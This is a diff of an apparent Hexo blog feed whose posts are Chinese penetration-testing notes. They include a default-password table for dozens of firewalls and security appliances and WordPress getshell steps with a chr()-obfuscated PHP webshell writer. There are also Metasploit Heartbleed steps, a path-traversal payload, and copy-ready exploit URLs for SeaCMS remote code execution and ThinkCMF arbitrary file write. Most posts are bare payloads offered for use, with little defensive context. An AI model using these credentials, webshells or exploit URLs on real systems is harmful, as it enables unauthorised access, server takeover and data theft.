@@ -11,6 +11,12 @@
         <content type="html"><![CDATA[<table><thead><tr><th>设备</th><th>默认账号</th><th>默认密码</th></tr></thead><tbody><tr><td>深信服产品</td><td>sangfor</td><td>sangfor sangfor@2018 sangfor@2019</td></tr><tr><td>深信服科技 AD</td><td></td><td>dlanrecover</td></tr><tr><td>深信服负载均衡 AD 3.6</td><td>admin</td><td>admin</td></tr><tr><td>深信服WAC ( WNS V2.6)</td><td>admin</td><td>admin</td></tr><tr><td>深信服v-p-n</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服ipsec-V-P-N (SSL 5.5)</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服AC6.0</td><td>admin</td><td>admin</td></tr><tr><td>SANGFOR防火墙</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服AF(NGAF V2.2)</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服NGAF下一代应用防火墙(NGAF V4.3)</td><td>admin</td><td>admin</td></tr><tr><td>深信服AD3.9</td><td>admin</td><td>admin</td></tr><tr><td>深信服上网行为管理设备数据中心</td><td>Admin</td><td>密码为空</td></tr><tr><td>SANGFOR_AD_v5.1</td><td>admin</td><td>admin</td></tr><tr><td>网御漏洞扫描系统</td><td>leadsec</td><td>leadsec</td></tr><tr><td>天阗入侵检测与管理系统 V7.0</td><td>Admin</td><td>venus70</td></tr><tr><td></td><td>Audit</td><td>venus70</td></tr><tr><td></td><td>adm</td><td>venus70</td></tr><tr><td>天阗入侵检测与管理系统 V6.0</td><td>Admin</td><td>venus60</td></tr><tr><td></td><td>Audit</td><td>venus60</td></tr><tr><td></td><td>adm</td><td>venus60</td></tr><tr><td>网御WAF集中控制中心(V3.0R5.0)</td><td>admin</td><td>leadsec.waf</td></tr><tr><td>audit</td><td>leadsec.waf</td><td></td></tr><tr><td>adm</td><td>leadsec.waf</td><td></td></tr><tr><td>联想网御</td><td>administrator</td><td>administrator</td></tr><tr><td>网御事件服务器</td><td>admin</td><td>admin123</td></tr><tr><td>联想网御防火墙PowerV</td><td>administrator</td><td>administrator</td></tr><tr><td>联想网御入侵检测系统</td><td>lenovo</td><td>default</td></tr><tr><td>网络卫士入侵检测系统</td><td>admin</td><td>talent</td></tr><tr><td>网御入侵检测系统V3.2.72.0</td><td>adm</td><td>leadsec32</td></tr><tr><td>admin</td><td>leadsec32</td><td></td></tr><tr><td>联想网御入侵检测系统IDS</td><td>root</td><td>111111</td></tr><tr><td>admin</td><td>admin123</td><td></td></tr><tr><td>科来网络回溯分析系统</td><td>csadmin</td><td>colasoft</td></tr><tr><td>中控考勤机web3.0</td><td>administrator</td><td>123456</td></tr><tr><td>H3C iMC</td><td>admin</td><td>admin</td></tr><tr><td>H3C SecPath系列</td><td>admin</td><td>admin</td></tr><tr><td>H3C S5120-SI</td><td>test</td><td>123</td></tr><tr><td>H3C智能管理中心</td><td>admin</td><td>admin</td></tr><tr><td>H3C ER3100</td><td>admin</td><td>adminer3100</td></tr><tr><td>H3C ER3200</td><td>admin</td><td>adminer3200</td></tr><tr><td>H3C ER3260</td><td>admin</td><td>adminer3260</td></tr><tr><td>H3C</td><td>admin</td><td>adminer</td></tr><tr><td></td><td>admin</td><td>admin</td></tr><tr><td></td><td>admin</td><td>h3capadmin</td></tr><tr><td></td><td>h3c</td><td>h3c</td></tr><tr><td>360天擎</td><td>admin</td><td>admin</td></tr><tr><td>网神防火墙</td><td>firewall</td><td>firewall</td></tr><tr><td>天融信防火墙NGFW4000</td><td>superman</td><td>talent</td></tr><tr><td>黑盾防火墙</td><td>admin</td><td>admin</td></tr><tr><td>rule</td><td>abc123</td><td></td></tr><tr><td>audit</td><td>abc123</td><td></td></tr><tr><td>华为防火墙</td><td>telnetuser</td><td>telnetpwd</td></tr><tr><td>ftpuser</td><td>ftppwd</td><td></td></tr><tr><td>方正防火墙</td><td>admin</td><td>admin</td></tr><tr><td>飞塔防火墙</td><td>admin</td><td>密码为空</td></tr><tr><td>Juniper_SSG__5防火墙</td><td>netscreen</td><td>netscreen</td></tr><tr><td>中新金盾硬件防火墙</td><td>admin</td><td>123</td></tr><tr><td>kill防火墙(冠群金辰)</td><td>admin</td><td>sys123</td></tr><tr><td>天清汉马USG防火墙</td><td>admin</td><td>venus.fw</td></tr><tr><td></td><td>Audit</td><td>venus.audit</td></tr><tr><td></td><td>useradmin</td><td>venus.user</td></tr><tr><td>阿姆瑞特防火墙</td><td>admin</td><td>manager</td></tr><tr><td>山石网科</td><td>hillstone</td><td>hillstone</td></tr><tr><td>绿盟安全审计系统</td><td>weboper</td><td>weboper</td></tr><tr><td></td><td>webaudit</td><td>webaudit</td></tr><tr><td></td><td>conadmin</td><td>conadmin</td></tr><tr><td></td><td>admin</td><td>admin</td></tr><tr><td></td><td>shell</td><td>shell</td></tr><tr><td>绿盟产品</td><td></td><td>nsfocus123</td></tr><tr><td>TopAudit日志审计系统</td><td>superman</td><td>talent</td></tr><tr><td>LogBase日志管理综合审计系统</td><td>admin</td><td>safetybase</td></tr><tr><td>网神SecFox运维安全管理与审计系统</td><td>admin</td><td>!1fw@2soc#3v-p-n</td></tr><tr><td>天融信数据库审计系统</td><td>superman</td><td>telent</td></tr><tr><td>Hillstone安全审计平台</td><td>hillstone</td><td>hillstone</td></tr><tr><td>网康日志中心</td><td>ns25000</td><td>ns25000</td></tr><tr><td>网络安全审计系统（中科新业）</td><td>admin</td><td>123456</td></tr><tr><td>天玥网络安全审计系统</td><td>Admin</td><td>cyberaudit</td></tr><tr><td>明御WEB应用防火墙</td><td>admin</td><td>admin</td></tr><tr><td>admin</td><td>adminadmin</td><td></td></tr><tr><td>明御攻防实验室平台</td><td>root</td><td>123456</td></tr><tr><td>明御安全网关</td><td>admin</td><td>adminadmin</td></tr><tr><td>明御运维审计与册风险控制系统</td><td>admin</td><td>1q2w3e</td></tr><tr><td></td><td>system</td><td>1q2w3e4r</td></tr><tr><td></td><td>auditor</td><td>1q2w3e4r</td></tr><tr><td></td><td>operator</td><td>1q2w3e4r</td></tr><tr><td>明御网站卫士</td><td>sysmanager</td><td>sysmanager888</td></tr><tr><td>亿邮邮件网关</td><td>eyouuser</td><td>eyou_admin</td></tr><tr><td></td><td>eyougw</td><td>admin@(eyou)</td></tr><tr><td></td><td>admin</td><td>+-ccccc</td></tr><tr><td></td><td>admin</td><td>cyouadmin</td></tr><tr><td>Websense邮件安全网关</td><td>administrator</td><td>admin</td></tr><tr><td>梭子鱼邮件存储网关</td><td>admin</td><td>admin</td></tr></tbody></table>]]></content>
       
       
+      <categories>
+          
+          <category> 运维编程 </category>
+          
+      </categories>
+      
       
     </entry>
     
@@ -24,6 +30,18 @@
         <content type="html"><![CDATA[<p>worldpress是一款主流的博客系统，但是关于它的漏洞也层出不穷。<br>这次是因为一次CTF靶场遇到此类情况，顺便做个简单记录。</p><p>worldpress系统本身比较安全，但是因为它可以自定义插件，很多时候因为插件作者安全开发的能力有高有低，导致许多安全漏洞的出现。</p><h2 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h2><p>后台默认地址为：<code>xxxx/wp-admin/</code></p><p>没有验证码可以暴力破解，常见用户名admin,worldpress,system等。</p><p>进入后台后的利用：</p><p>1 上传主题包getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机建立目录“upkn”,把一句话1.php放进去。打包upkn目录为zip文件。WP后台的主题管理，上传主题，安装。则你的后门路径为：</span><br><span class="line">wp-content&#x2F;themes&#x2F;upkn&#x2F;1.php。</span><br></pre></td></tr></table></figure><p>2 修改主题文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“外观”-“编辑”-“404模板</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;&#x2F;script&gt;</span><br><span class="line">插到文件头</span><br><span class="line">点404模板的时候地址栏有相对路径，默认是wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php</span><br><span class="line">更新完直接访问localhost&#x2F;wp-content&#x2F;themes&#x2F;twentyten&#x2F;404.php就会在twentyten目录生成一句话后门a.php 密码a</span><br></pre></td></tr></table></figure><h2 id="0x02-插件漏洞利用"><a href="#0x02-插件漏洞利用" class="headerlink" title="0x02 插件漏洞利用"></a>0x02 插件漏洞利用</h2><p>插件漏洞类型很多，例如xss,sql注入，rce等。</p><p>推荐工具方便自查：<a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p>]]></content>
       
       
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 测试 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -36,6 +54,12 @@
       
         <content type="html"><![CDATA[<h1 id="心脏滴血-CVE-2014-0160"><a href="#心脏滴血-CVE-2014-0160" class="headerlink" title="心脏滴血(CVE-2014-0160)"></a>心脏滴血(CVE-2014-0160)</h1><hr><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>心脏出血（英语：Heartbleed），也简称为心血漏洞，是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。它于2012年被引入了软件中，2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。</p><p>摘自百度百科</p><p>更专业的说：</p><p>OpenSSL的Heartbleed模块存在一个BUG，当攻击者构造一个特殊的数据包，满足用户心跳包中无法提供足够多的数据会导致memcpy函数把SSLv3记录之后的数据直接输出，该漏洞导致攻击者可以远程读取存在漏洞版本的OpenSSL服务器内存中多达64K的数据。</p><h2 id="0x02-受影响的版本"><a href="#0x02-受影响的版本" class="headerlink" title="0x02 受影响的版本"></a>0x02 受影响的版本</h2><ul><li>OpenSSL 1.0.2-beta</li><li>OpenSSL 1.0.1 - OpenSSL 1.0.1f<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2>使用工具：<code>Metasploit</code><br>第一步     <code>搜索模块</code> ps:搜索关键字即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190955624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步     <code>使用模块</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ssl&#x2F;openssl_heartbleed</span><br></pre></td></tr></table></figure></li></ul><p>第三步    <code>查看参数</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options    发现需要设置目标ip，端口443默认设置。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200302191402487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第四步     <code>设置参数利用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts  目标ip              设置目标ip</span><br><span class="line">set verbose true                设置内容现实</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200302191733204.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/202003021917490.png" alt="在这里插入图片描述"><br>第五步     <code>攻击利用</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run&#x2F;exploit    两个命令都可以</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞危害"><a href="#0x04-漏洞危害" class="headerlink" title="0x04 漏洞危害"></a>0x04 漏洞危害</h2><p><code>下图就是攻击后返的内容:</code><br><img src="https://img-blog.csdnimg.cn/20200302192147349.png" alt="在这里插入图片描述"><br>我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。上图为获取到的账户密码信息。</p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><ul><li>停止旧版的 openssl 服务，升级 openssl 到新版本，并重新启动。</li><li>修改密码。</li></ul>]]></content>
       
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
       
       
     </entry>
@@ -50,12 +74,12 @@
         <content type="html"><![CDATA[<p><strong>我的第一个CNVD编号：CNVD-2020-10212</strong></p><p><strong>实验环境：win7 专业版  梦想cms v1.4 phpstudy</strong></p><p>漏洞位置：<br>template\admin\Template\temedit.html目录下的模版编辑功能<br> <img src="https://img-blog.csdnimg.cn/2020032109291647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现该地方直接将路径和文件名进行了拼接，其中代码关键在于变量$dir的获取<br>搜索editfile函数<br><img src="https://img-blog.csdnimg.cn/20200321093041502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="11"></p><p>发现$dir直接通过GET方式进行获取，没有进行过滤，且直接拼接进文件内容请求链接。<br>漏洞链接为：<br><code>xxx.com/admin.php?m=Template&amp;a=editfile&amp;dir=default/error.html</code><br>随便在目录下创建1.txt（内容为happy new year）验证猜想。<br>  <img src="https://img-blog.csdnimg.cn/20200321092942146.png" alt="在这里插入图片描述"></p><p>将dir参数值改为“../1.txt”，发现成功获取文件内容。</p><p><img src="https://img-blog.csdnimg.cn/20200321093134902.png" alt="在这里插入图片描述"></p><p>构造payload,尝试获取C盘根目录的Windows/system.ini文件<br><code>xxx.com/admin.php?m=Template&amp;a=editfile&amp;dir=../../../../../Windows/system.ini</code><br><img src="https://img-blog.csdnimg.cn/20200321093149160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功验证！</p>]]></content>
       
       
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
       
-        <tags>
-            
-            <tag> 代码审计 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -68,6 +92,12 @@
       
         <content type="html"><![CDATA[<p><code>题目地址：https://oschina.gitee.io/gitee-7th/#/game</code></p><h2 id="0x01-第一关"><a href="#0x01-第一关" class="headerlink" title="0x01 第一关"></a>0x01 第一关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/fa9c2c21-935a-447c-b71f-ebe03d7c1d1c.png" alt=""></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>base64解码字符串，拼接<code>gitee</code>,访问最终地址：<code>https://gitee.com/mvphp</code>即可找到flag</p><p><img src="https://imgkr.cn-bj.ufileos.com/9f39e2e0-fa4d-4522-a445-4820e2b513cd.png" alt=""></p><h2 id="0x02-第二关"><a href="#0x02-第二关" class="headerlink" title="0x02 第二关"></a>0x02 第二关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/72c79231-25ad-42d6-ad0d-54238264cbf2.png" alt=""></p><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>在gitee搜索<code>阴祸德芙</code>，找到房间，并打开桌子文件，利用在线网站解密摩斯密码皆可通关，最终答案为<code>saiban</code></p><p><img src="https://imgkr.cn-bj.ufileos.com/394af19a-d470-4c54-a669-e02a276c85a2.png" alt=""><br><img src="https://imgkr.cn-bj.ufileos.com/60f1e54d-46d7-40cd-bd90-5835ea8c47b1.png" alt=""></p><h2 id="0x03-第三关"><a href="#0x03-第三关" class="headerlink" title="0x03 第三关"></a>0x03 第三关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/f59a5fa6-8c34-452e-8aba-4b66b37e1446.png" alt=""></p><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>利用给出文章的音调排列，一二声为平，代表数字0。三四声为仄，代表数字1。</p><p>利用在线网站进行二进制转ASCII，文章最终翻译为<br><br>01100010 b<br><br>01110101 u<br><br>01100111 g<br><br>01110000 p<br><br>01101100 l<br><br>01100001 a<br><br>01101110 n<br><br>01100101 e<br><br>01110100 t<br><br>flag为<code>bugplanet</code></p><h2 id="0x04-第四关"><a href="#0x04-第四关" class="headerlink" title="0x04 第四关"></a>0x04 第四关</h2><p><img src="https://imgkr.cn-bj.ufileos.com/773e9609-72fe-44bb-9029-855066ad2032.png" alt=""></p><h3 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h3><p>说是有规律，但是没找出来，233。<br></p><p>ID位置确实三位字符，<br>第一位可能为<code>JXLMN</code>中一位<br>第二位可能为<code>PQRST</code>中一位<br>第三位确定为<code>X</code><br></p><p>密码位置两位字符，<br>第一位可能为<code>fgh</code>中一位<br>第二位可能为<code>opqr</code>中一位<br></p><p>利用了web爆破思路进行爆破</p><p><img src="https://imgkr.cn-bj.ufileos.com/2822980f-0910-4842-9d23-7b2d789c102b.png" alt=""></p><p><img src="https://imgkr.cn-bj.ufileos.com/af5de26e-4986-4430-ac49-dd1b49cf43bd.png" alt=""></p><p>登录后发现平面图，直接F12审查黄点元素，填入坐标格式flag即可，最终flag为<code>83,117</code></p><p><img src="https://imgkr.cn-bj.ufileos.com/4ee52195-6987-4920-984c-edbcc2dc3157.png" alt=""></p>]]></content>
       
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
       
       
     </entry>
@@ -82,6 +112,12 @@
         <content type="html"><![CDATA[<p>海洋影视管理系统(seacms，海洋cms)是一套专为不同需求的站长而设计的视频点播系统。</p><h2 id="0x01-利用EXP"><a href="#0x01-利用EXP" class="headerlink" title="0x01 利用EXP"></a>0x01 利用EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx.com&#x2F;search.php?searchtype&#x3D;5&amp;searchword&#x3D;&#123;if&#123;searchpage:year&#125;&amp;year&#x3D;:e&#123;searchpage:area&#125;&#125;&amp;area&#x3D;v&#123;searchpage:letter&#125;&amp;letter&#x3D;al&#123;searchpage:lang&#125;&amp;yuyan&#x3D;(join&#123;searchpage:jq&#125;&amp;jq&#x3D;($_P&#123;searchpage:ver&#125;&amp;&amp;ver&#x3D;OST[9]))</span><br></pre></td></tr></table></figure><h2 id="0x02-webshell"><a href="#0x02-webshell" class="headerlink" title="0x02 webshell"></a>0x02 webshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URl 链接为shell地址，密码为 9[]</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzExLzA2L01pZUN2VC5wbmc?x-oss-process=image/format,png" alt="avatar"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzExLzA2L01pZTkyVi5wbmc?x-oss-process=image/format,png" alt="avatar"></p>]]></content>
       
       
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
       
     </entry>
     
@@ -94,6 +130,12 @@
       
         <content type="html"><![CDATA[<p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。</p><a id="more"></a><h2 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h2><p>ThinkCMF X1.6.0</p><p>ThinkCMF X2.1.0</p><p>ThinkCMF X2.2.0</p><p>ThinkCMF X2.2.1</p><p>ThinkCMF X2.2.2</p><p>ThinkCMF X2.2.3</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件<br>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure><p>最终会在目录下生成test.php的shell一句话。</p>]]></content>
       
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
       
       
     </entry>
@@ -108,6 +150,12 @@
         <content type="html"><![CDATA[<p>腾讯金刚审计系统 <a href="http://service.security.tencent.com/kingkong" target="_blank" rel="noopener">http://service.security.tencent.com/kingkong</a> 免费 无限制<br>腾讯御安全 <a href="http://yaq.qq.com/" target="_blank" rel="noopener">http://yaq.qq.com/</a> 免费 查看漏洞详情需认证<br>阿里聚安全 <a href="http://jaq.alibaba.com/" target="_blank" rel="noopener">http://jaq.alibaba.com/</a> 免费 查看漏洞详情需认证<br>360显微镜 <a href="http://appscan.360.cn/" target="_blank" rel="noopener">http://appscan.360.cn/</a> 免费 无限制<br>360APP漏洞扫描 <a href="http://dev.360.cn/html/vulscan/scanning.html" target="_blank" rel="noopener">http://dev.360.cn/html/vulscan/scanning.html</a> 免费 无限制<br>百度MTC <a href="http://mtc.baidu.com" target="_blank" rel="noopener">http://mtc.baidu.com</a> 9.9元/次 无限制<br>梆梆 <a href="https://dev.bangcle.com" target="_blank" rel="noopener">https://dev.bangcle.com</a> 免费 无限制<br>爱内测 <a href="http://www.ineice.com/" target="_blank" rel="noopener">http://www.ineice.com/</a> 免费 无限制<br>通付盾 <a href="http://www.appfortify.cn/" target="_blank" rel="noopener">http://www.appfortify.cn/</a> 免费 无限制<br>NAGA <a href="http://www.nagain.com/appscan/" target="_blank" rel="noopener">http://www.nagain.com/appscan/</a> 免费 无限制<br>GES审计系统 <a href="http://01hackcode.com/" target="_blank" rel="noopener">http://01hackcode.com/</a> 免费 无限制<br>盘古出品的Janeus<a href="http://appscan.io" target="_blank" rel="noopener">http://appscan.io</a><br>Janus <a href="http://cloud.appscan.io" target="_blank" rel="noopener">http://cloud.appscan.io</a><br>APP逆向main_classify_list <a href="https://android.fallible.co/" target="_blank" rel="noopener">https://android.fallible.co/</a><br>java在线反编译Java decompiler online <a href="http://www.javadecompilers.com" target="_blank" rel="noopener">http://www.javadecompilers.com</a><br>腾讯电脑管家：哈勃 <a href="http://habo.qq.com/" target="_blank" rel="noopener">http://habo.qq.com/</a><br>腾讯TSRC：金刚 <a href="http://service.security.tencent.com/" target="_blank" rel="noopener">http://service.security.tencent.com/</a><br>阿里聚安全：<a href="http://jaq.alibaba.com/" target="_blank" rel="noopener">http://jaq.alibaba.com/</a><br>西安交通大学 sanddroid：<a href="http://sanddroid.xjtu.edu.cn/#home" target="_blank" rel="noopener">http://sanddroid.xjtu.edu.cn/#home</a><br>金山火眼：<a href="http://fireeye.ijinshan.com/analyse.html" target="_blank" rel="noopener">http://fireeye.ijinshan.com/analyse.html</a><br>瀚海源文件B超：<a href="https://b-chao.com" target="_blank" rel="noopener">https://b-chao.com</a></p>]]></content>
       
       
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
       
     </entry>
     
@@ -120,6 +168,12 @@
       
         <content type="html"><![CDATA[<p>1.Windows下：修改my.ini 在[mysqld]内加入 secure_file_priv =<br>2.Linux下：       修改my.cnf 在[mysqld]内加入 secure_file_priv =</p><p>MYSQL新特性secure_file_priv对读写文件的影响,然后重启mysql，即可写入文件！</p>]]></content>
       
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
       
       
     </entry>
@@ -136,16 +190,10 @@
       
       <categories>
           
-          <category> ctf </category>
+          <category> CTF </category>
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> test </tag>
-            
-        </tags>
       
     </entry>
     
